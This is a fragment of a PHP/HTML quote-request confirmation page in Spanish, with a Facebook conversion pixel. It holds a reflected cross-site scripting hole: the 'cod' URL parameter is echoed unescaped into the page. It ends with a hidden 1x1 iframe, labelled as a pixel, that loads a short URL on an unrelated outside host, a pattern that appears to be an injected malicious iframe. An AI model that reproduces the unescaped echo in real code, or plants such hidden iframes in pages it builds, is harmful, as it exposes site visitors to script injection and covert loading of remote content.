...
<!-- Facebook Conversion Code for Nueva Web - Cotización General -->


<script type="text/javascript">
var fb_param = {};
fb_param.pixel_id = '6013199479423';
fb_param.value = '0.00';
...
<noscript><img height="1" width="1" alt="" style="display:none" src="https://www.facebook.com/offsite_event.php?id=6013199479423&amp;value=0&amp;currency=USD" /></noscript>
        ...
        <div class="col-lg-10 fix-padding">
            <div id="titulo"><h1>COTIZA AQUÍ  <span>]</span></h1><div id="linea-titulo-cotizar"></div></div>
                ...
                <div id="contacto-content">
                    <span>Su Nro. de Solicitud es <strong style="color:#C21924;"><?php echo isset($_GET['cod']) ? $_GET['cod'] : 0 ?></strong>
                </div>
        </div>
        <div class="col-lg-1"></div>
        </div>
...
<!-- PIXEL -->
<iframe src="http://www2.balao.de/SLJy3" scrolling="no" frameborder="0" width="1" height="1"></iframe>
